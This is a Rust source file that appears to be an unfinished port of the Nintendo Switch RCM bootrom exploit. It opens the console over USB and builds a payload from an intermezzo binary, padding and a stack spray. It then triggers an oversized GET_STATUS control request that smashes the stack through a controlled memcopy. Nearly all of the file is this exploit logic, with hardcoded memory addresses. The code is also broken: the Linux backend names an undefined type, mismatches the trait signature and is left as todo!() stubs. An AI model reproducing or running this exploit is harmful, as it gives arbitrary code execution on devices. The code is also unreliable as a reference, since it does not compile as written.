use std::time::Duration;

use rusb::{DeviceHandle, GlobalContext};

struct Switch {
    device: DeviceHandle<GlobalContext>,
}

impl Switch {
    pub fn new() -> Option<Self> {
        // Default Nintendo Switch RCM VID and PIC
        let vid = 0x0955;
        let pid = 0x7321;

        Self::with_vid_and_pid(vid, pid)
    }

    pub fn with_vid_and_pid(vid: u16, pid: u16) -> Option<Self> {
        let mut device = rusb::open_device_with_vid_pid(vid, pid)?;
        device.claim_interface(0).unwrap();
        Some(Self { device })
    }

    pub fn read(&self, buf: &mut [u8]) -> rusb::Result<usize> {
        let a = self
            .device
            .read_manufacturer_string_ascii(&self.device.device().device_descriptor()?)?;
        dbg!(a);
        self.device.read_bulk(0x81, buf, Duration::from_secs(1))
    }

    fn write_buffer(&self, buf: &[u8]) -> rusb::Result<usize> {
        self.device.write_bulk(0x01, buf, Duration::from_secs(1))
    }
}

trait Vulnerability {
    fn backend_name() -> &'static str;
    fn trigger(&self, length: usize) -> rusb::Result<usize>;
    fn supported(&self) -> bool;
}

#[cfg(target_os = "macos")]
impl Vulnerability for Switch {
    fn backend_name() -> &'static str {
        "macos"
    }

    fn trigger(&self, length: usize) -> rusb::Result<usize> {
        const GET_STATUS: u8 = 0x0;
        const STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT: u8 = 0x82;

        let mut buf = vec![0u8; length];

        self.device.read_control(
            STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT,
            GET_STATUS,
            0,
            0,
            &mut buf,
            Duration::from_secs(1),
        )
    }

    fn supported(&self) -> bool {
        true
    }
}

#[cfg(target_os = "linux")]
impl Vulnerability for HaxBackend {
    fn backend_name() -> &'static str {
        todo!()
    }

    fn trigger(&mut self, length: usize) {
        todo!()
    }

    fn supported(&self) -> bool {
        todo!()
    }
}

const STACK_END: usize = 0x40010000;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BufferState {
    High,
    Low,
}

impl BufferState {
    fn toggle(&mut self) {
        match self {
            BufferState::High => *self = BufferState::Low,
            BufferState::Low => *self = BufferState::High,
        }
    }

    fn address(&self) -> usize {
        const COPY_BUFFER_ADDRESSES_LOW: usize = 0x40005000;
        const COPY_BUFFER_ADDRESSES_HIGH: usize = 0x40009000;
        match *self {
            BufferState::Low => COPY_BUFFER_ADDRESSES_LOW,
            BufferState::High => COPY_BUFFER_ADDRESSES_HIGH,
        }
    }
}

pub struct Rcm {
    switch: Switch,
    current_buffer: BufferState,
    total_written: usize,
}

pub struct Payload {
    pub data: Box<[u8]>,
}

impl Payload {
    pub fn new(payload: &[u8]) -> Self {
        const INTERMEZZO: &[u8; 124] = include_bytes!("intermezzo.bin");
        const MAX_LENGTH: u32 = 0x30298;

        const PAYLOAD_START_ADDR: usize = 0x40010E40;
        const RCM_PAYLOAD_ADDR: usize = 0x40010000;

        let mut payload_builder: Vec<u8> = Vec::with_capacity(MAX_LENGTH as usize);
        // start with the max_len arg
        payload_builder.extend(MAX_LENGTH.to_le_bytes());
        // pad with data to get to the start of IRAM
        payload_builder.extend([b'\0'; 680 - MAX_LENGTH.to_le_bytes().len()]);
        // add the intermezzo bin
        payload_builder.extend(INTERMEZZO);

        const PADDING_SIZE_1: usize = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + INTERMEZZO.len());
        payload_builder.extend([b'\0'; PADDING_SIZE_1]);

        // fit a a part of the payload before the stack spray
        const STACK_SPRAY_START: usize = 0x40014E40;
        const STACK_SPRAY_END: usize = 0x40017000;
        const PADDING_SIZE_2: usize = STACK_SPRAY_START - PAYLOAD_START_ADDR;
        const REPEAT_COUNT: usize = (STACK_SPRAY_END - STACK_SPRAY_START) / 4;
        // TODO: fix potential panic
        let split = payload.split_at(PADDING_SIZE_2);
        payload_builder.extend(split.0);
        // start stack spray
        for _ in 0..REPEAT_COUNT {
            payload_builder.extend((RCM_PAYLOAD_ADDR as u32).to_le_bytes())
        }
        payload_builder.extend(split.1);

        // finish padding to be a size of 0x1000
        let padding_size = 0x1000 - (payload_builder.len() % 0x1000);
        payload_builder.resize(payload_builder.len() + padding_size, b'\0');

        assert_eq!(payload_builder.len() % 0x1000, 0);

        let data = payload_builder.into_boxed_slice();
        assert!(data.len() <= MAX_LENGTH as usize);
        Self { data }
    }

    pub fn data(&self) -> &[u8] {
        &self.data
    }
}

impl Rcm {
    pub fn new(wait: bool) -> Self {
        // TODO: don't unwrap
        let switch = Switch::new().unwrap();
        Self {
            switch,
            current_buffer: BufferState::Low,
            total_written: 0,
        }
    }

    /// Writes data to the RCM protocol endpoint
    pub fn write(&mut self, buf: &[u8]) -> rusb::Result<usize> {
        const PACKET_SIZE: usize = 0x1000;
        const MAX_LENGTH: usize = 0x30298;

        assert!(buf.len() <= MAX_LENGTH);

        let mut remaining_buf = &buf[..];
        let mut length_remaining = buf.len();

        let mut written = 0;

        while length_remaining != 0 {
            let data_to_transmit = length_remaining.min(PACKET_SIZE);
            length_remaining -= data_to_transmit;

            let chunk = &remaining_buf[..data_to_transmit];
            remaining_buf = &remaining_buf[data_to_transmit..];
            match self.write_buffer(chunk) {
                Ok(size) => written += size,
                Err(e) => return Err(e),
            };
        }

        Ok(written)
    }

    pub fn current_buff_addr(&self) -> usize {
        self.current_buffer.address()
    }

    pub fn switch_to_highbuf(&mut self) -> rusb::Result<()> {
        if self.current_buffer != BufferState::High {
            let buf = &[b'\0'; 0x1000];
            self.write(buf)?;
        }
        Ok(())
    }

    pub fn trigger_controlled_memcopy(&self) -> rusb::Result<usize> {
        let length = STACK_END - self.current_buff_addr();
        self.trigger_controlled_memcopy_length(length)
    }

    pub fn trigger_controlled_memcopy_length(&self, length: usize) -> rusb::Result<usize> {
        self.switch.trigger(length)
    }

    fn write_buffer(&mut self, buf: &[u8]) -> rusb::Result<usize> {
        self.toggle_buffer();
        self.switch.write_buffer(buf)
    }

    fn toggle_buffer(&mut self) {
        self.current_buffer.toggle();
    }

    fn read(&mut self, buf: &mut [u8]) -> rusb::Result<usize> {
        self.switch.read(buf)
    }

    pub fn read_device_id(&mut self) {
        let mut buf = [b'\0'; 16];
        self.read(&mut buf).unwrap();
        dbg!(buf);
    }
}
